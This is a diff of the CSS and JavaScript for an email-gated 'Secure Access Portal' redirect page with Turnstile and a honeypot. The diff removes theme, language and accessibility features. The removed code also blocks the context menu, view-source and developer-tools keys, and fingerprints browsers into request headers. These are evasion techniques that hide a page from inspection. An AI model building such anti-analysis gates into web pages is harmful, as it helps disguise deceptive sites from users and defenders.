-    font-size: 20px;
-    transition: var(--transition);
-    backdrop-filter: blur(10px);
-}
-
-.theme-btn:hover {
-    transform: scale(1.1);
-    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-}
-
-/* Language selector */
-.language-selector {
-    position: fixed;
-    top: 20px;
-    left: 20px;
-    z-index: 1000;
-}
-
-.lang-select {
-    background: var(--card-bg);
-    border: 2px solid var(--border-color);
-    border-radius: var(--border-radius);
-    padding: 8px 12px;
-    font-size: 14px;
-    color: var(--text-color);
-    cursor: pointer;
-    backdrop-filter: blur(10px);
-    transition: var(--transition);
-}
-
-.lang-select:focus {
-    outline: none;
-    border-color: var(--primary-color);
-    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
 }
 
 .container {
@@ -927,12 +734,6 @@ body {
     animation: shake 0.5s ease-in-out;
 }
 
-.help-text {
-    font-size: 14px;
-    color: var(--text-secondary);
-    margin-top: 5px;
-}
-
 .turnstile-container {
     display: flex;
     justify-content: center;
@@ -990,37 +791,6 @@ body {
     border: 1px solid rgba(231, 76, 60, 0.3);
 }
 
-/* Accessibility controls */
-.accessibility-controls {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    display: flex;
-    gap: 10px;
-    z-index: 1000;
-}
-
-.accessibility-btn {
-    background: var(--card-bg);
-    border: 2px solid var(--border-color);
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 14px;
-    font-weight: bold;
-    transition: var(--transition);
-    backdrop-filter: blur(10px);
-}
-
-.accessibility-btn:hover {
-    transform: scale(1.1);
-    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-}
-
 /* Animations */
 @keyframes fadeIn {
     from {
@@ -1052,87 +822,8 @@ body {
     .header p {
         font-size: 14px;
     }
-    
-    .theme-toggle,
-    .language-selector {
-        position: static;
-        margin-bottom: 20px;
-    }
-    
-    .accessibility-controls {
-        position: static;
-        justify-content: center;
-        margin-top: 20px;
-    }
-}
-
-/* Focus indicators for accessibility */
-*:focus {
-    outline: 2px solid var(--primary-color);
-    outline-offset: 2px;
-}
-
-/* Screen reader only text */
-.sr-only {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    padding: 0;
-    margin: -1px;
-    overflow: hidden;
-    clip: rect(0, 0, 0, 0);
-    white-space: nowrap;
-    border: 0;
-}
-
-/* Disable text selection */
-body {
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    user-select: none;
-}
-
-/* Allow text selection for inputs */
-input, textarea, select {
-    -webkit-user-select: text;
-    -moz-user-select: text;
-    -ms-user-select: text;
-    user-select: text;
 }`,
-    'script.js': `// Enhanced security and bot protection
-document.addEventListener('contextmenu', e => e.preventDefault());
-document.addEventListener('keydown', e => {
-    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i')) {
-        e.preventDefault();
-    }
-    if (e.key === 'F12') {
-        e.preventDefault();
-    }
-});
-
-// Browser fingerprinting for bot detection
-function generateClientHash() {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillText('Browser fingerprint', 2, 2);
-    
-    const fingerprint = [
-        navigator.userAgent,
-        navigator.language,
-        screen.width + 'x' + screen.height,
-        new Date().getTimezoneOffset(),
-        navigator.hardwareConcurrency,
-        navigator.deviceMemory,
-        canvas.toDataURL()
-    ].join('|');
-    
-    return btoa(fingerprint).substring(0, 32);
-}
-
-// Main application logic with enhanced features
+    'script.js': `// Main application logic
 class SecureRedirectApp {
     constructor() {
         this.form = document.getElementById('emailForm');
@@ -1140,202 +831,18 @@ class SecureRedirectApp {
         this.submitBtn = document.getElementById('submitBtn');
         this.messageDiv = document.getElementById('message');
         this.turnstileWidget = null;
-        this.config = null;
-        this.currentLanguage = 'en';
-        this.currentTheme = 'auto';
         
         this.init();
     }
     
-    async init() {
-        await this.loadConfig();
+    init() {
         this.setupEventListeners();
         this.setupTurnstile();
-        this.setupTheme();
-        this.setupLanguage();
-        this.setupAccessibility();
-        this.setupBrowserFingerprinting();
-    }
-    
-    async loadConfig() {
-        try {
-            const response = await fetch('/api/config');
-            this.config = await response.json();
-        } catch (error) {
-            console.error('Failed to load config:', error);
-            this.config = {
-                theme: 'auto',
-                language: 'en',
-                branding: {
-                    title: 'Secure Access Portal',
-                    primaryColor: '#667eea',
-                    secondaryColor: '#764ba2'
-                },
-                features: {
-                    darkMode: true,
-                    multiLanguage: true,
-                    accessibility: true
-                }
-            };
-        }
     }
     
     setupEventListeners() {
         this.form.addEventListener('submit', (e) => this.handleSubmit(e));
         this.emailInput.addEventListener('input', () => this.clearError());
-        this.emailInput.addEventListener('focus', () => this.showHelpText());
-        this.emailInput.addEventListener('blur', () => this.hideHelpText());
-    }
-    
-    setupBrowserFingerprinting() {
-        // Add browser fingerprinting headers to all requests
-        const originalFetch = window.fetch;
-        window.fetch = function(url, options = {}) {
-            const headers = options.headers || {};
-            headers['X-Client-Hash'] = generateClientHash();
-            headers['X-User-Agent'] = navigator.userAgent;
-            headers['X-Screen-Resolution'] = screen.width + 'x' + screen.height;
-            
-            options.headers = headers;
-            return originalFetch(url, options);
-        };
-    }
-    
-    setupTheme() {
-        const themeToggle = document.getElementById('themeToggle');
-        const savedTheme = localStorage.getItem('theme') || this.config.theme;
-        
-        this.setTheme(savedTheme);
-        
-        themeToggle.addEventListener('click', () => {
-            const themes = ['auto', 'light', 'dark', 'high-contrast'];
-            const currentIndex = themes.indexOf(this.currentTheme);
-            const nextIndex = (currentIndex + 1) % themes.length;
-            this.setTheme(themes[nextIndex]);
-        });
-    }
-    
-    setTheme(theme) {
-        this.currentTheme = theme;
-        document.documentElement.setAttribute('data-theme', theme);
-        localStorage.setItem('theme', theme);
-        
-        const themeIcon = document.querySelector('.theme-icon');
-        const icons = {
-            'auto': '🌓',
-            'light': '☀️',
-            'dark': '🌙',
-            'high-contrast': '⚫'
-        };
-        themeIcon.textContent = icons[theme] || '🌓';
-    }
-    
-    setupLanguage() {
-        const languageSelect = document.getElementById('languageSelect');
-        const savedLanguage = localStorage.getItem('language') || this.config.language;
-        
-        languageSelect.value = savedLanguage;
-        this.setLanguage(savedLanguage);
-        
-        languageSelect.addEventListener('change', (e) => {
-            this.setLanguage(e.target.value);
-        });
-    }
-    
-    setLanguage(language) {
-        this.currentLanguage = language;
-        localStorage.setItem('language', language);
-        
-        const translations = {
-            en: {
-                title: 'Secure Access Portal',
-                subtitle: 'Enter your email to continue',
-                placeholder: 'Enter your email address',
-                continue: 'Continue',
-                verifying: 'Verifying...',
-                redirecting: 'Redirecting...',
-                errorInvalidEmail: 'Please enter a valid email address.',
-                errorVerification: 'Please complete the verification.',
-                errorAccessDenied: 'Access denied.',
-                errorGeneral: 'An error occurred. Please try again.',
-                helpEmail: 'Enter a valid email address to continue.'
-            },
-            es: {
-                title: 'Portal de Acceso Seguro',
-                subtitle: 'Ingrese su correo electrónico para continuar',
-                placeholder: 'Ingrese su dirección de correo electrónico',
-                continue: 'Continuar',
-                verifying: 'Verificando...',
-                redirecting: 'Redirigiendo...',
-                errorInvalidEmail: 'Por favor ingrese una dirección de correo válida.',
-                errorVerification: 'Por favor complete la verificación.',
-                errorAccessDenied: 'Acceso denegado.',
-                errorGeneral: 'Ocurrió un error. Por favor intente de nuevo.',
-                helpEmail: 'Ingrese una dirección de correo válida para continuar.'
-            },
-            fr: {
-                title: 'Portail d\'Accès Sécurisé',
-                subtitle: 'Entrez votre email pour continuer',
-                placeholder: 'Entrez votre adresse email',
-                continue: 'Continuer',
-                verifying: 'Vérification...',
-                redirecting: 'Redirection...',
-                errorInvalidEmail: 'Veuillez entrer une adresse email valide.',
-                errorVerification: 'Veuillez compléter la vérification.',
-                errorAccessDenied: 'Accès refusé.',
-                errorGeneral: 'Une erreur s\'est produite. Veuillez réessayer.',
-                helpEmail: 'Entrez une adresse email valide pour continuer.'
-            },
-            de: {
-                title: 'Sicherer Zugangsportal',
-                subtitle: 'Geben Sie Ihre E-Mail-Adresse ein, um fortzufahren',
-                placeholder: 'Geben Sie Ihre E-Mail-Adresse ein',
-                continue: 'Weiter',
-                verifying: 'Überprüfung...',
-                redirecting: 'Weiterleitung...',
-                errorInvalidEmail: 'Bitte geben Sie eine gültige E-Mail-Adresse ein.',
-                errorVerification: 'Bitte vervollständigen Sie die Überprüfung.',
-                errorAccessDenied: 'Zugriff verweigert.',
-                errorGeneral: 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.',
-                helpEmail: 'Geben Sie eine gültige E-Mail-Adresse ein, um fortzufahren.'
-            }
-        };
-        
-        const t = translations[language] || translations.en;
-        
-        document.getElementById('pageTitle').textContent = t.title;
-        document.getElementById('pageSubtitle').textContent = t.subtitle;
-        this.emailInput.placeholder = t.placeholder;
-        this.submitBtn.querySelector('.btn-text').textContent = t.continue;
-        this.submitBtn.querySelector('.btn-loading').textContent = t.verifying;
-        
-        // Update help text
-        this.helpText = t.helpEmail;
-    }
-    
-    setupAccessibility() {
-        const increaseFontBtn = document.getElementById('increaseFontSize');
-        const decreaseFontBtn = document.getElementById('decreaseFontSize');
-        const highContrastBtn = document.getElementById('highContrast');
-        
-        increaseFontBtn.addEventListener('click', () => {
-            const currentSize = parseFloat(getComputedStyle(document.body).fontSize);
-            document.body.style.fontSize = (currentSize + 2) + 'px';
-        });
-        
-        decreaseFontBtn.addEventListener('click', () => {
-            const currentSize = parseFloat(getComputedStyle(document.body).fontSize);
-            document.body.style.fontSize = Math.max(12, currentSize - 2) + 'px';
-        });
-        
-        highContrastBtn.addEventListener('click', () => {
-            const currentTheme = document.documentElement.getAttribute('data-theme');
-            if (currentTheme === 'high-contrast') {
-                this.setTheme('auto');
-            } else {
-                this.setTheme('high-contrast');
-            }
-        });
     }
     
     setupTurnstile() {
@@ -1384,26 +891,15 @@ class SecureRedirectApp {
         this.showError('Verification expired. Please try again.');
     }
     
-    showHelpText() {
-        const helpDiv = document.getElementById('emailHelp');
-        helpDiv.textContent = this.helpText || 'Enter a valid email address to continue.';
-        helpDiv.style.display = 'block';
-    }
-    
-    hideHelpText() {
-        const helpDiv = document.getElementById('emailHelp');
-        helpDiv.style.display = 'none';
-    }
-    
     async handleSubmit(e) {
         e.preventDefault();
         
         const email = this.emailInput.value.trim();
         const honeypotField = document.getElementById('honeypotField').value;
         
-        // Validate email format
-        if (!this.isValidEmail(email)) {
-            this.showError('Please enter a valid email address.');
+        // Basic email check - let server handle detailed validation
+        if (!email || email.trim() === '') {
+            this.showError('Please enter an email address.');
             return;
         }
         
@@ -1441,13 +937,6 @@ class SecureRedirectApp {
                 if (window.turnstile) {
                     window.turnstile.reset();
                 }
-                
-                // Handle exponential backoff
-                if (data.delay) {
-                    setTimeout(() => {
-                        this.submitBtn.disabled = false;
-                    }, data.delay * 1000);
-                }
             }
         } catch (error) {
             console.error('Error:', error);
@@ -1459,11 +948,6 @@ class SecureRedirectApp {
         } finally {
             this.setLoading(false);
         }
-    }
-    
-    isValidEmail(email) {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailRegex.test(email);
     }
     
     showError(message) {
